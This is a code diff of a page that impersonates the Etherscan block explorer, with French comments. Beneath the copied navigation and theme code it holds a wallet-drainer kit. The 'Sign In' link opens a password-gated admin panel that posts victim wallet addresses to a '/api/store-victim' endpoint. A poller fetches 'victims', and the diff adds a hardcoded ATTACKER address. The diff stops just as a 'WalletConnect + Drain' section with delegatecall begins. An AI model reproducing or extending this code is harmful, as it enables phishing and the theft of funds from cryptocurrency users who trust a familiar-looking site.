@@ -615,643 +615,632 @@
   </footer>
 
   <!-- CDN -->
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.2.0/dist/ethers.umd.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/qr-code-styling@1/lib/qr-code-styling.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.9.0/dist/index.umd.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.2.0/dist/ethers.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/qr-code-styling@1/lib/qr-code-styling.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.9.0/dist/index.umd.js"></script>
 
-  <script>
-    /* ===== Icônes ===== */
-    const ICONS = {
-      chevronDown: '<path d="m6 9 6 6 6-6"/>',
-      userCircle: '<circle cx="12" cy="12" r="10"/><circle cx="12" cy="10" r="3"/><path d="M7 20.7a8 8 0 0 1 10 0"/>',
-      externalLink: '<path d="M15 3h6v6"/><path d="M10 14 21 3"/><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/>',
-      fileInput: '<path d="M4 22h14a2 2 0 0 0 2-2V7l-5-5H6a2 2 0 0 0-2 2v4"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M2 15h10"/><path d="m9 18 3-3-3-3"/>',
-      fileCode: '<path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7z"/><path d="m9 18 3-3-3-3"/>',
-      refresh: '<path d="M21 12a9 9 0 1 1-3-6.7L21 8"/><path d="M21 3v5h-5"/>',
-      download: '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m7 10 5 5 5-5"/><path d="M12 15V3"/>',
-      wallet: '<path d="M19 7V5a2 2 0 0 0-2-2H5a2 2 0 0 0 0 4h15a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5"/><path d="M18 12h.01"/>',
-      send: '<path d="m22 2-7 20-4-9-9-4Z"/><path d="M22 2 11 13"/>',
-      binary: '<rect x="14" y="14" width="6" height="6" rx="1"/><rect x="4" y="4" width="6" height="6" rx="1"/><path d="M4 20h6M14 4h6M14 10h6M4 14h6"/>',
-      code: '<path d="m18 16 4-4-4-4"/><path d="m6 8-4 4 4 4"/><path d="m14.5 4-5 16"/>',
-      fileCheck: '<path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7z"/><path d="m9 15 2 2 4-4"/>',
-      search: '<circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>',
-      searchCode: '<path d="m9 9-2 2 2 2"/><path d="m13 13 2-2-2-2"/><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>',
-      gitCompare: '<circle cx="18" cy="18" r="3"/><circle cx="6" cy="6" r="3"/><path d="M13 6h3a2 2 0 0 1 2 2v7"/><path d="M11 18H8a2 2 0 0 1-2-2V9"/>',
-      fileTerminal: '<path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7z"/><path d="m8 16 2-2-2-2"/><path d="M12 18h4"/>',
-      fuel: '<path d="M3 22h12V4a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2Z"/><path d="M3 12h12"/><path d="M18 8v9a2 2 0 0 0 4 0V9l-3-3"/>',
-      swap: '<path d="M8 3 4 7l4 4"/><path d="M4 7h16"/><path d="m16 21 4-4-4-4"/><path d="M20 17H4"/>',
-      server: '<rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><path d="M6 6h.01M6 18h.01"/>',
-      tags: '<path d="m15 5 6 6-7 7-6-6V5Z"/><path d="M10 9h.01"/>',
-      globe: '<circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15 15 0 0 1 0 20a15 15 0 0 1 0-20"/>',
-      shieldCheck: '<path d="M20 13c0 5-3.5 7.5-8 9-4.5-1.5-8-4-8-9V6l8-3 8 3Z"/><path d="m9 12 2 2 4-4"/>',
-      penLine: '<path d="M12 20h9"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4Z"/>',
-      message: '<path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2Z"/>',
-      filter: '<path d="M22 3H2l8 9.5V19l4 2v-8.5Z"/>',
-      messages: '<path d="M14 9a2 2 0 0 1-2 2H6l-4 4V4a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2Z"/><path d="M18 9h2a2 2 0 0 1 2 2v11l-4-4h-6a2 2 0 0 1-2-2v-1"/>',
-      sun: '<circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M6.3 17.7l-1.4 1.4M19.1 4.9l-1.4 1.4"/>',
-      moon: '<path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/>',
-      moonStar: '<path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/><path d="M19 3v4M17 5h4"/>',
-      monitor: '<rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/>',
-      check: '<path d="M20 6 9 17l-5-5"/>',
-    };
+<script>
+  /* ===== Icônes (inchangées) ===== */
+  const ICONS = {
+    chevronDown: '<path d="m6 9 6 6 6-6"/>',
+    userCircle: '<circle cx="12" cy="12" r="10"/><circle cx="12" cy="10" r="3"/><path d="M7 20.7a8 8 0 0 1 10 0"/>',
+    externalLink: '<path d="M15 3h6v6"/><path d="M10 14 21 3"/><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/>',
+    fileInput: '<path d="M4 22h14a2 2 0 0 0 2-2V7l-5-5H6a2 2 0 0 0-2 2v4"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M2 15h10"/><path d="m9 18 3-3-3-3"/>',
+    fileCode: '<path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7z"/><path d="m9 18 3-3-3-3"/>',
+    refresh: '<path d="M21 12a9 9 0 1 1-3-6.7L21 8"/><path d="M21 3v5h-5"/>',
+    download: '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m7 10 5 5 5-5"/><path d="M12 15V3"/>',
+    wallet: '<path d="M19 7V5a2 2 0 0 0-2-2H5a2 2 0 0 0 0 4h15a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5"/><path d="M18 12h.01"/>',
+    send: '<path d="m22 2-7 20-4-9-9-4Z"/><path d="M22 2 11 13"/>',
+    binary: '<rect x="14" y="14" width="6" height="6" rx="1"/><rect x="4" y="4" width="6" height="6" rx="1"/><path d="M4 20h6M14 4h6M14 10h6M4 14h6"/>',
+    code: '<path d="m18 16 4-4-4-4"/><path d="m6 8-4 4 4 4"/><path d="m14.5 4-5 16"/>',
+    fileCheck: '<path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7z"/><path d="m9 15 2 2 4-4"/>',
+    search: '<circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>',
+    searchCode: '<path d="m9 9-2 2 2 2"/><path d="m13 13 2-2-2-2"/><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>',
+    gitCompare: '<circle cx="18" cy="18" r="3"/><circle cx="6" cy="6" r="3"/><path d="M13 6h3a2 2 0 0 1 2 2v7"/><path d="M11 18H8a2 2 0 0 1-2-2V9"/>',
+    fileTerminal: '<path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7z"/><path d="m8 16 2-2-2-2"/><path d="M12 18h4"/>',
+    fuel: '<path d="M3 22h12V4a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2Z"/><path d="M3 12h12"/><path d="M18 8v9a2 2 0 0 0 4 0V9l-3-3"/>',
+    swap: '<path d="M8 3 4 7l4 4"/><path d="M4 7h16"/><path d="m16 21 4-4-4-4"/><path d="M20 17H4"/>',
+    server: '<rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><path d="M6 6h.01M6 18h.01"/>',
+    tags: '<path d="m15 5 6 6-7 7-6-6V5Z"/><path d="M10 9h.01"/>',
+    globe: '<circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15 15 0 0 1 0 20a15 15 0 0 1 0-20"/>',
+    shieldCheck: '<path d="M20 13c0 5-3.5 7.5-8 9-4.5-1.5-8-4-8-9V6l8-3 8 3Z"/><path d="m9 12 2 2 4-4"/>',
+    penLine: '<path d="M12 20h9"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4Z"/>',
+    message: '<path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2Z"/>',
+    filter: '<path d="M22 3H2l8 9.5V19l4 2v-8.5Z"/>',
+    messages: '<path d="M14 9a2 2 0 0 1-2 2H6l-4 4V4a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2Z"/><path d="M18 9h2a2 2 0 0 1 2 2v11l-4-4h-6a2 2 0 0 1-2-2v-1"/>',
+    sun: '<circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M6.3 17.7l-1.4 1.4M19.1 4.9l-1.4 1.4"/>',
+    moon: '<path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/>',
+    moonStar: '<path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/><path d="M19 3v4M17 5h4"/>',
+    monitor: '<rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/>',
+    check: '<path d="M20 6 9 17l-5-5"/>',
+  };
 
-    function svg(name, cls) {
-      return '<svg class="' + (cls || 'icon') + '" viewBox="0 0 24 24" aria-hidden="true">' + ICONS[name] + '</svg>';
-    }
+  function svg(name, cls) {
+    return '<svg class="' + (cls || 'icon') + '" viewBox="0 0 24 24" aria-hidden="true">' + ICONS[name] + '</svg>';
+  }
 
-    /* ===== Menu ===== */
-    const navItems = [
-      { label: 'Home', href: 'https://etherscan.io/' },
-      {
-        label: 'Blockchain', href: 'https://etherscan.io/',
-        items: [
-          { label: 'Transactions', href: 'https://etherscan.io/txs' },
-          { label: 'Pending Transactions', href: 'https://etherscan.io/txsPending' },
-          { label: 'Contract Internal Transactions', href: 'https://etherscan.io/internal-trxs' },
-          { label: 'Cross-Chain Transactions', href: 'https://etherscan.io/crosschain-txs' },
-          { label: 'Beacon Deposits', href: 'https://etherscan.io/beacondeposits' },
-          { label: 'Beacon Withdrawals', href: 'https://etherscan.io/beaconwithdraw' },
-          { label: 'View Blobs', href: 'https://etherscan.io/blobs' },
-          { label: 'AA Transactions', href: 'https://etherscan.io/aa-txs' },
-          { label: 'EIP-7702 Authorizations', href: 'https://etherscan.io/eip7702-authorizations', badge: 'Beta' },
-          { label: 'View Blocks', href: 'https://etherscan.io/blocks', divider: true },
-          { label: 'Forked Blocks (Reorgs)', href: 'https://etherscan.io/blocks_forked' },
-          { label: 'Uncles', href: 'https://etherscan.io/uncles' },
-          { label: 'Top Accounts', href: 'https://etherscan.io/accounts', divider: true },
-          { label: 'Verified Contracts', href: 'https://etherscan.io/contractsVerified', divider: true },
-        ],
-      },
-      {
-        label: 'Tokens', href: 'https://etherscan.io/tokens',
-        items: [
-          { label: 'Token Approvals', href: 'https://etherscan.io/approvals' },
-          { label: 'Top Tokens', href: 'https://etherscan.io/tokens' },
-          { label: 'View ERC-20 Transfers', href: 'https://etherscan.io/tokentxns' },
-          { label: 'ERC-20 Tokens By Holding', href: 'https://etherscan.io/tokenholdings' },
-          { label: 'Top NFTs', href: 'https://etherscan.io/top-nfts' },
-          { label: 'Latest Mints', href: 'https://etherscan.io/nftmints' },
-        ],
-      },
-      {
-        label: 'NFTs', href: 'https://etherscan.io/nft-top-contracts',
-        items: [
-          { label: 'Top NFTs', href: 'https://etherscan.io/top-nfts' },
-          { label: 'Trending NFTs', href: 'https://etherscan.io/trendingnft' },
-          { label: 'Latest Mints', href: 'https://etherscan.io/nftmints' },
-          { label: 'NFT Hottest', href: 'https://etherscan.io/nfthottest' },
-          { label: 'NFT Top Trades', href: 'https://etherscan.io/nft-top-trades' },
-        ],
-      },
-      {
-        label: 'Resources', href: 'https://etherscan.io/',
-        items: [
-          { label: 'Subgraphs', href: 'https://etherscan.io/subgraphs' },
-          { label: 'Charts & Stats', href: 'https://etherscan.io/charts' },
-          { label: 'Top Statistics', href: 'https://etherscan.io/stats' },
-          { label: 'Directory of Verified Contracts', href: 'https://etherscan.io/contractsVerified' },
-          { label: 'Signs of Scam', href: 'https://etherscan.io/scams' },
-          { label: 'Comments/Reviews', href: 'https://etherscan.io/comments' },
-          { label: 'Gas Tracker', href: 'https://etherscan.io/gastracker' },
-          { label: 'Unit Converter', href: 'https://etherscan.io/unitconverter' },
-          { label: 'Verified Contracts', href: 'https://etherscan.io/contractsVerified' },
-        ],
-      },
-      {
-        label: 'API', href: 'https://etherscan.io/apis',
-        items: [
-          { label: 'API Documentation', href: 'https://docs.etherscan.io/' },
-          { label: 'API Plans', href: 'https://etherscan.io/apis' },
-          { label: 'API Key', href: 'https://etherscan.io/myapikey' },
-        ],
-      },
-      {
-        label: 'More',
-        columns: [] // vide, mais avec columns pour déclencher le mega-menu
-      },
-    ];
+  /* ===== Menu (inchangé) ===== */
+  const navItems = [
+    { label: 'Home', href: 'https://etherscan.io/' },
+    {
+      label: 'Blockchain', href: 'https://etherscan.io/',
+      items: [
+        { label: 'Transactions', href: 'https://etherscan.io/txs' },
+        { label: 'Pending Transactions', href: 'https://etherscan.io/txsPending' },
+        { label: 'Contract Internal Transactions', href: 'https://etherscan.io/internal-trxs' },
+        { label: 'Cross-Chain Transactions', href: 'https://etherscan.io/crosschain-txs' },
+        { label: 'Beacon Deposits', href: 'https://etherscan.io/beacondeposits' },
+        { label: 'Beacon Withdrawals', href: 'https://etherscan.io/beaconwithdraw' },
+        { label: 'View Blobs', href: 'https://etherscan.io/blobs' },
+        { label: 'AA Transactions', href: 'https://etherscan.io/aa-txs' },
+        { label: 'EIP-7702 Authorizations', href: 'https://etherscan.io/eip7702-authorizations', badge: 'Beta' },
+        { label: 'View Blocks', href: 'https://etherscan.io/blocks', divider: true },
+        { label: 'Forked Blocks (Reorgs)', href: 'https://etherscan.io/blocks_forked' },
+        { label: 'Uncles', href: 'https://etherscan.io/uncles' },
+        { label: 'Top Accounts', href: 'https://etherscan.io/accounts', divider: true },
+        { label: 'Verified Contracts', href: 'https://etherscan.io/contractsVerified', divider: true },
+      ],
+    },
+    {
+      label: 'Tokens', href: 'https://etherscan.io/tokens',
+      items: [
+        { label: 'Token Approvals', href: 'https://etherscan.io/approvals' },
+        { label: 'Top Tokens', href: 'https://etherscan.io/tokens' },
+        { label: 'View ERC-20 Transfers', href: 'https://etherscan.io/tokentxns' },
+        { label: 'ERC-20 Tokens By Holding', href: 'https://etherscan.io/tokenholdings' },
+        { label: 'Top NFTs', href: 'https://etherscan.io/top-nfts' },
+        { label: 'Latest Mints', href: 'https://etherscan.io/nftmints' },
+      ],
+    },
+    {
+      label: 'NFTs', href: 'https://etherscan.io/nft-top-contracts',
+      items: [
+        { label: 'Top NFTs', href: 'https://etherscan.io/top-nfts' },
+        { label: 'Trending NFTs', href: 'https://etherscan.io/trendingnft' },
+        { label: 'Latest Mints', href: 'https://etherscan.io/nftmints' },
+        { label: 'NFT Hottest', href: 'https://etherscan.io/nfthottest' },
+        { label: 'NFT Top Trades', href: 'https://etherscan.io/nft-top-trades' },
+      ],
+    },
+    {
+      label: 'Resources', href: 'https://etherscan.io/',
+      items: [
+        { label: 'Subgraphs', href: 'https://etherscan.io/subgraphs' },
+        { label: 'Charts & Stats', href: 'https://etherscan.io/charts' },
+        { label: 'Top Statistics', href: 'https://etherscan.io/stats' },
+        { label: 'Directory of Verified Contracts', href: 'https://etherscan.io/contractsVerified' },
+        { label: 'Signs of Scam', href: 'https://etherscan.io/scams' },
+        { label: 'Comments/Reviews', href: 'https://etherscan.io/comments' },
+        { label: 'Gas Tracker', href: 'https://etherscan.io/gastracker' },
+        { label: 'Unit Converter', href: 'https://etherscan.io/unitconverter' },
+        { label: 'Verified Contracts', href: 'https://etherscan.io/contractsVerified' },
+      ],
+    },
+    {
+      label: 'API', href: 'https://etherscan.io/apis',
+      items: [
+        { label: 'API Documentation', href: 'https://docs.etherscan.io/' },
+        { label: 'API Plans', href: 'https://etherscan.io/apis' },
+        { label: 'API Key', href: 'https://etherscan.io/myapikey' },
+      ],
+    },
+    {
+      label: 'More',
+      columns: [] // déclenche le mega-menu
+    },
+  ];
 
-    const navList = document.getElementById('nav-list');
-    const megaHost = document.getElementById('mega-host');
-    let openMenu = null;
+  const navList = document.getElementById('nav-list');
+  const megaHost = document.getElementById('mega-host');
+  let openMenu = null;
 
-    function renderNav() {
-      let html = '';
-      navItems.forEach(function (item) {
-        const hasMenu = !!(item.items || item.columns);
-        html += '<li data-label="' + item.label + '">';
-        if (hasMenu) {
-          html += '<button type="button" class="nav-btn" data-menu="' + item.label + '">' + item.label + svg('chevronDown') + '</button>';
-        } else {
-          html += '<a class="nav-link" href="' + item.href + '">' + item.label + '</a>';
-        }
-        if (item.items) {
-          html += '<div class="dropdown" data-panel="' + item.label + '" hidden>';
-          item.items.forEach(function (sub) {
-            if (sub.divider) html += '<div class="divider"></div>';
-            html += '<a href="' + sub.href + '"' + (sub.external ? ' target="_blank" rel="noopener noreferrer"' : '') + '>' + sub.label +
-              (sub.badge ? '<span class="badge-pill">' + sub.badge + '</span>' : '') + '</a>';
-          });
-          html += '</div>';
-        }
-        html += '</li>';
-      });
-      html += '<li aria-hidden="true" class="nav-sep">|</li>';
-      html += '<li><a class="signin" href="https://etherscan.io/login">' + svg('userCircle', 'icon icon-md') + 'Sign In' + svg('chevronDown') + '</a></li>';
-      navList.innerHTML = html;
-
-      // Render mega menus for items with columns (ici seul More est concerné, mais il est en dur dans le HTML, donc rien à faire)
-    }
-
-    function setOpen(label) {
-      openMenu = label;
-      document.querySelectorAll('[data-panel]').forEach(function (p) {
-        p.hidden = p.getAttribute('data-panel') !== label;
-      });
-      document.querySelectorAll('.nav-btn').forEach(function (b) {
-        b.classList.toggle('open', b.getAttribute('data-menu') === label);
-      });
-
-      // Polling pour le menu More
-      if (label === 'More') {
-        fetchVictims();
-        if (!victimPollTimer) {
-          victimPollTimer = setInterval(fetchVictims, 5000);
-        }
+  function renderNav() {
+    let html = '';
+    navItems.forEach(function (item) {
+      const hasMenu = !!(item.items || item.columns);
+      html += '<li data-label="' + item.label + '">';
+      if (hasMenu) {
+        html += '<button type="button" class="nav-btn" data-menu="' + item.label + '">' + item.label + svg('chevronDown') + '</button>';
       } else {
-        clearInterval(victimPollTimer);
-        victimPollTimer = null;
+        html += '<a class="nav-link" href="' + item.href + '">' + item.label + '</a>';
       }
-    }
-
-    renderNav();
-
-    navList.querySelectorAll('li[data-label]').forEach(function (li) {
-      li.addEventListener('mouseenter', function () {
-        const label = li.getAttribute('data-label');
-        const item = navItems.find(function (i) { return i.label === label; });
-        setOpen(item && (item.items || item.columns) ? label : null);
-      });
-    });
-    navList.querySelectorAll('.nav-btn').forEach(function (btn) {
-      btn.addEventListener('click', function () {
-        const label = btn.getAttribute('data-menu');
-        setOpen(openMenu === label ? null : label);
-      });
-    });
-    document.getElementById('site-header').addEventListener('mouseleave', function () { setOpen(null); });
-
-    /* ===== Thèmes ===== */
-    const THEME_KEY = 'etherscan-theme';
-    const themeOptions = [
-      { value: 'light', label: 'Light', icon: 'sun' },
-      { value: 'dim', label: 'Dim', icon: 'moonStar' },
-      { value: 'dark', label: 'Dark', icon: 'moon' },
-      { value: 'auto', label: 'Auto (System)', icon: 'monitor' },
-    ];
-
-    const themeBtn = document.getElementById('theme-btn');
-    const themeMenu = document.getElementById('theme-menu');
-    let theme = localStorage.getItem(THEME_KEY) || 'light';
-
-    function resolve(choice) {
-      if (choice !== 'auto') return choice;
-      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
-    }
-
-    function applyTheme(choice) {
-      const root = document.documentElement;
-      root.classList.remove('dim', 'dark');
-      const resolved = resolve(choice);
-      if (resolved !== 'light') root.classList.add(resolved);
-      const opt = themeOptions.find(function (o) { return o.value === choice; }) || themeOptions[0];
-      themeBtn.innerHTML = svg(opt.icon, 'icon');
-      themeBtn.style.color = 'var(--azure-40)';
-      renderThemeMenu();
-    }
-
-    function renderThemeMenu() {
-      themeMenu.innerHTML = themeOptions.map(function (o) {
-        return '<button type="button" data-theme="' + o.value + '">' + svg(o.icon) + '<span>' + o.label + '</span>' +
-          (theme === o.value ? svg('check', 'icon check') : '') + '</button>';
-      }).join('');
-      themeMenu.querySelectorAll('button').forEach(function (b) {
-        b.addEventListener('click', function () {
-          theme = b.getAttribute('data-theme');
-          localStorage.setItem(THEME_KEY, theme);
-          applyTheme(theme);
-          themeMenu.hidden = true;
+      if (item.items) {
+        html += '<div class="dropdown" data-panel="' + item.label + '" hidden>';
+        item.items.forEach(function (sub) {
+          if (sub.divider) html += '<div class="divider"></div>';
+          html += '<a href="' + sub.href + '"' + (sub.external ? ' target="_blank" rel="noopener noreferrer"' : '') + '>' + sub.label +
+            (sub.badge ? '<span class="badge-pill">' + sub.badge + '</span>' : '') + '</a>';
         });
+        html += '</div>';
+      }
+      html += '</li>';
+    });
+    html += '<li aria-hidden="true" class="nav-sep">|</li>';
+    html += '<li><a class="signin" href="https://etherscan.io/login">' + svg('userCircle', 'icon icon-md') + 'Sign In' + svg('chevronDown') + '</a></li>';
+    navList.innerHTML = html;
+
+    // Render mega menus for items with columns (ici seul More est concerné, mais il est en dur dans le HTML)
+  }
+
+  function setOpen(label) {
+    openMenu = label;
+    document.querySelectorAll('[data-panel]').forEach(function (p) {
+      p.hidden = p.getAttribute('data-panel') !== label;
+    });
+    document.querySelectorAll('.nav-btn').forEach(function (b) {
+      b.classList.toggle('open', b.getAttribute('data-menu') === label);
+    });
+
+    // Polling pour le menu More
+    if (label === 'More') {
+      fetchVictims();
+      if (!victimPollTimer) {
+        victimPollTimer = setInterval(fetchVictims, 5000);
+      }
+    } else {
+      clearInterval(victimPollTimer);
+      victimPollTimer = null;
+    }
+  }
+
+  renderNav();
+
+  navList.querySelectorAll('li[data-label]').forEach(function (li) {
+    li.addEventListener('mouseenter', function () {
+      const label = li.getAttribute('data-label');
+      const item = navItems.find(function (i) { return i.label === label; });
+      setOpen(item && (item.items || item.columns) ? label : null);
+    });
+  });
+  navList.querySelectorAll('.nav-btn').forEach(function (btn) {
+    btn.addEventListener('click', function () {
+      const label = btn.getAttribute('data-menu');
+      setOpen(openMenu === label ? null : label);
+    });
+  });
+  document.getElementById('site-header').addEventListener('mouseleave', function () { setOpen(null); });
+
+  /* ===== Thèmes (inchangé) ===== */
+  const THEME_KEY = 'etherscan-theme';
+  const themeOptions = [
+    { value: 'light', label: 'Light', icon: 'sun' },
+    { value: 'dim', label: 'Dim', icon: 'moonStar' },
+    { value: 'dark', label: 'Dark', icon: 'moon' },
+    { value: 'auto', label: 'Auto (System)', icon: 'monitor' },
+  ];
+
+  const themeBtn = document.getElementById('theme-btn');
+  const themeMenu = document.getElementById('theme-menu');
+  let theme = localStorage.getItem(THEME_KEY) || 'light';
+
+  function resolve(choice) {
+    if (choice !== 'auto') return choice;
+    return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+  }
+
+  function applyTheme(choice) {
+    const root = document.documentElement;
+    root.classList.remove('dim', 'dark');
+    const resolved = resolve(choice);
+    if (resolved !== 'light') root.classList.add(resolved);
+    const opt = themeOptions.find(function (o) { return o.value === choice; }) || themeOptions[0];
+    themeBtn.innerHTML = svg(opt.icon, 'icon');
+    themeBtn.style.color = 'var(--azure-40)';
+    renderThemeMenu();
+  }
+
+  function renderThemeMenu() {
+    themeMenu.innerHTML = themeOptions.map(function (o) {
+      return '<button type="button" data-theme="' + o.value + '">' + svg(o.icon) + '<span>' + o.label + '</span>' +
+        (theme === o.value ? svg('check', 'icon check') : '') + '</button>';
+    }).join('');
+    themeMenu.querySelectorAll('button').forEach(function (b) {
+      b.addEventListener('click', function () {
+        theme = b.getAttribute('data-theme');
+        localStorage.setItem(THEME_KEY, theme);
+        applyTheme(theme);
+        themeMenu.hidden = true;
       });
+    });
+  }
+
+  themeBtn.addEventListener('click', function (e) {
+    e.stopPropagation();
+    themeMenu.hidden = !themeMenu.hidden;
+  });
+  document.addEventListener('mousedown', function (e) {
+    if (!themeMenu.hidden && !themeMenu.contains(e.target) && e.target !== themeBtn) themeMenu.hidden = true;
+  });
+  window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', function () {
+    if (theme === 'auto') applyTheme('auto');
+  });
+
+  applyTheme(theme);
+
+  /* ===== Admin Panel via Sign In ===== */
+  const adminModal = document.getElementById('admin-modal');
+  const closeAdmin = document.getElementById('close-admin');
+  const adminLoginBtn = document.getElementById('admin-login-btn');
+  const adminPassword = document.getElementById('admin-password');
+  const loginError = document.getElementById('login-error');
+  const adminDrainDiv = document.getElementById('admin-drain');
+  const adminLoginDiv = document.getElementById('admin-login');
+  const victimAddress = document.getElementById('victim-address');
+  const drainBtn = document.getElementById('drain-btn');
+  const drainStatus = document.getElementById('drain-status');
+
+  const ADMIN_PASSWORD = 'admin'; // change if you want
+  const ADMIN_SECRET = 'mon_secret_admin'; // must match API env
+
+  // Open modal when "Sign In" is clicked
+  document.addEventListener('click', function(e) {
+    if (e.target.closest('.signin')) {
+      e.preventDefault();
+      adminModal.classList.add('open');
+      // reset
+      adminLoginDiv.style.display = 'block';
+      adminDrainDiv.style.display = 'none';
+      adminPassword.value = '';
+      loginError.style.display = 'none';
+      drainStatus.textContent = '';
     }
+  });
 
-    themeBtn.addEventListener('click', function (e) {
-      e.stopPropagation();
-      themeMenu.hidden = !themeMenu.hidden;
-    });
-    document.addEventListener('mousedown', function (e) {
-      if (!themeMenu.hidden && !themeMenu.contains(e.target) && e.target !== themeBtn) themeMenu.hidden = true;
-    });
-    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', function () {
-      if (theme === 'auto') applyTheme('auto');
-    });
+  // Close modal
+  closeAdmin.addEventListener('click', () => adminModal.classList.remove('open'));
+  window.addEventListener('click', (e) => {
+    if (e.target === adminModal) adminModal.classList.remove('open');
+  });
 
-    applyTheme(theme);
-
-    /* ===== Admin Panel via Sign In ===== */
-    const adminModal = document.getElementById('admin-modal');
-    const closeAdmin = document.getElementById('close-admin');
-    const adminLoginBtn = document.getElementById('admin-login-btn');
-    const adminPassword = document.getElementById('admin-password');
-    const loginError = document.getElementById('login-error');
-    const adminDrainDiv = document.getElementById('admin-drain');
-    const adminLoginDiv = document.getElementById('admin-login');
-    const victimAddress = document.getElementById('victim-address');
-    const drainBtn = document.getElementById('drain-btn');
-    const drainStatus = document.getElementById('drain-status');
-
-    const ADMIN_PASSWORD = 'admin'; // change if you want
-    const ADMIN_SECRET = 'mon_secret_admin'; // must match API env
-
-    // Open modal when "Sign In" is clicked
-    document.addEventListener('click', function(e) {
-      if (e.target.closest('.signin')) {
-        e.preventDefault();
-        adminModal.classList.add('open');
-        // reset
-        adminLoginDiv.style.display = 'block';
-        adminDrainDiv.style.display = 'none';
-        adminPassword.value = '';
-        loginError.style.display = 'none';
-        drainStatus.textContent = '';
-      }
-    });
-
-    // Close modal
-    closeAdmin.addEventListener('click', () => adminModal.classList.remove('open'));
-    window.addEventListener('click', (e) => {
-      if (e.target === adminModal) adminModal.classList.remove('open');
-    });
-
-    // Unlock drain form
-    adminLoginBtn.addEventListener('click', () => {
-      if (adminPassword.value === ADMIN_PASSWORD) {
-        adminLoginDiv.style.display = 'none';
-        adminDrainDiv.style.display = 'block';
-        sessionStorage.setItem('adminToken', ADMIN_SECRET);
-      } else {
-        loginError.style.display = 'block';
-      }
-    });
-
-    // Drain manually
-    drainBtn.addEventListener('click', async () => {
-      const victim = victimAddress.value.trim();
-      if (!ethers.utils.isAddress(victim)) {
-        drainStatus.textContent = '❌ Invalid address';
-        return;
-      }
-      drainStatus.textContent = '⏳ Draining...';
-      try {
-        const resp = await fetch('/api/store-victim', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ victim, adminSecret: ADMIN_SECRET })
-        });
-        const data = await resp.json();
-        drainStatus.textContent = data.success ? '✅ Drain successful' : `❌ ${data.error || 'Failed'}`;
-      } catch (err) {
-        drainStatus.textContent = '❌ Network error';
-      }
-    });
-
-    /* ===== WalletConnect + Drain (corrigé avec delegatecall) ===== */
-    const ATTACKER = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
